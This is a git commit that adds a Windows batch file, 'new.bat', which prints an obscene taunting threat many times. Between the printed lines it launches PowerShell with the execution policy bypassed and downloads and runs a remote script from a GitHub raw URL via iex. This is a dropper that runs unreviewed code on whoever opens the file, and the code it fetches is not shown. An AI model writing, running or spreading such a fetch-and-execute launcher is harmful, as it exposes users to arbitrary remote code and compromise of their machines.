722939f5d6a5d67b0a826ff7aec84dc6786971d8
GIIITSCR <aasdwasdawsd@gmail.com>
2025-08-23 18:17:01 +0400

    Create new.bat

---
+++ new.bat
@@ -0,0 +1,27 @@
+@echo off
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+timeout /t 2 /nobreak >nul
+
+powershell -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/GIIITSCR/okak/refs/heads/main/script.ps1'))"
+
+echo.
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+echo тоби пизда
+pause
